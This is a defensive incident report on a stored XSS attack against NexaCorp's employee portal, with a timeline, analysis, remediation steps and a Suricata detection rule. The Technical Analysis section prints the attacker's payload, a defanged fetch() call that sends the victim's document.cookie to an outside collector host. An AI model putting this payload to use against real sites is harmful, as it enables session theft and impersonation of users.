# NexaCorp Industries — Incident Report

**INC-2026-006 — Stored XSS and Session Hijacking**

| Field | Detail |
|---|---|
| Prepared by | Zoltan Frenyo, SOC Analyst — BeCode Corp |
| Client | NexaCorp Industries |
| Target system | NexaPortal — bru-web-02 (192.168.10.24) |
| Date of incident | 18 June 2026 |
| Submission date | 21 June 2026 |
| Classification | Confidential — NexaCorp management |

---

## Executive Summary

On 18 June 2026, an attacker planted a malicious script in NexaCorp's employee portal (NexaPortal) and used it to steal another employee's login session. The attacker logged in using the account of a legitimate user, `m.renard`, and submitted a hidden piece of JavaScript through the portal's feedback form. The portal stored that script and ran it in the browser of anyone who later opened the feedback page.

When employee `p.dumont` viewed the page at 17:50:58, the script silently sent their session cookie to a server the attacker controlled. About a minute later, the attacker used that stolen session to browse the portal as `p.dumont`, opening their dashboard, profile, and orders pages.

The attack is entirely web-based and left no trace in the server's SSH or system logs. NexaCorp's monitoring raised no alert on the day, which points to a gap in web-application detection.

---

## Timeline

All times are local server time (CEST, UTC+2).

| Time | What happened |
|---|---|
| 10:32:25 | Attacker visits the login page — early reconnaissance |
| 16:17:41 | Attacker probes the feedback page without logging in |
| 17:30:40 | Attacker logs in as `m.renard` — success |
| 17:30:48 | Attacker submits the XSS payload to the feedback form (stored) |
| 17:30:52 | Second submission confirms the payload is stored |
| 17:50:58 | Victim `p.dumont` opens the feedback page; the script runs |
| 17:51:00 | The victim's session cookie is sent to the attacker's server |
| 17:52:02 | Attacker reuses the stolen session to browse as `p.dumont` |

---

## Technical Analysis

**The account used.** The attacker logged in as `m.renard`. The portal transmits credentials in cleartext over HTTP, and the login was captured in the network traffic. How the attacker obtained the `m.renard` credentials is not answered by this incident's evidence, but it is a serious question in its own right — this is the backdoor account planted during the earlier server compromise.

**The payload.** The attacker submitted the following script through the feedback form's comment field:

```
[script]fetch('hxxp://91[.]92[.]100[.]45:8080/collect?c='+btoa(document.cookie))[/script]
```

In plain terms: the script makes the victim's browser send all of its cookies to the attacker's server at `91[.]92[.]100[.]45:8080`. The `btoa` function Base64-encodes the cookie so it can be passed cleanly in a web address. The portal stored the comment without cleaning it, so the script ran for every user who opened the page afterwards.

**The theft.** When `p.dumont` loaded the feedback page, their browser ran the script and sent their session cookie (`PHPSESSID`) to the attacker. The feedback page was noticeably larger than normal in the logs (4,377 bytes versus about 1,823), which is the stored script being served back inside the page.

**The reuse.** Sixty-three seconds after stealing the cookie, the attacker used it to browse the portal as `p.dumont`, opening the dashboard, profile, and orders pages. The portal accepted the session without checking whether it was coming from the same machine or network as the original login.

---

## Impact

The attacker gained access to `p.dumont`'s account by riding their stolen session. They viewed whatever `p.dumont` could see: the dashboard, personal profile, and orders. Because the portal does not tie a session to its original source, a stolen cookie is enough to fully impersonate a user until the session expires.

The wider risk is that the stored script would have run for any employee who opened the feedback page, not just `p.dumont`, so more sessions could have been taken.

---

## Detection Gap

NexaCorp's Wazuh raised no alert on the day of the incident. The attack lives entirely in web traffic and never touches SSH or the operating system, so host-based monitoring cannot see it. A Suricata rule was written and validated to detect the script being submitted to the feedback form. It is included in the appendix.

After this incident, NexaCorp added `HttpOnly` cookie protection and a Content Security Policy, which would stop this specific attack from working again. Those fixes are effective for the XSS vector, though they do not address the `m.renard` backdoor account, which is the subject of the later incident.

---

## Remediation Recommendations

### Immediate

- Invalidate all active portal sessions to cut off any stolen cookies still in use.
- Investigate and disable the `m.renard` account used to plant the payload.
- Block the attacker's collection server (`91[.]92[.]100[.]45`) at the firewall.

### Medium-term

- Clean and encode all user input before storing or displaying it, so scripts cannot be stored in the feedback form.
- Set the `HttpOnly` flag on session cookies so scripts cannot read them (done after this incident).
- Add a Content Security Policy to block unauthorised scripts (done after this incident).
- Serve the portal over HTTPS so credentials and cookies are not sent in cleartext.

### Strategic / Detection

- Enable the Suricata rule from this investigation.
- Tie sessions to their original source or add re-authentication for sensitive pages.

---

## Appendix

### A — MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Exploit Public-Facing Application | T1190 |
| Steal Web Session Cookie | T1539 |

### B — Suricata Detection Rule

Fires on a script tag submitted in a POST body. Alert count on replay: 2.

```suricata
alert http any any -> $HTTP_SERVERS any (msg:"Stored XSS Attempt - script tag in POST body"; flow:established,to_server; http.method; content:"POST"; http.request_body; content:"<script"; nocase; classtype:web-application-attack; sid:9000001; rev:1;)
```

### C — Key Evidence

| Item | Value |
|---|---|
| Attacker IP | 91[.]92[.]100[.]45 |
| Cookie collector | hxxp://91[.]92[.]100[.]45:8080/collect |
| Account used to inject | m.renard |
| Victim account | p.dumont |
| Injection page | /portal/feedback.php |
| Stolen cookie | PHPSESSID |
| Payload stored | 18 June 2026 17:30:48 +0200 |
| Session stolen | 18 June 2026 17:51:00 +0200 |

---

*Prepared by Zoltan Frenyo, SOC Analyst, BeCode Corp — 21 June 2026*
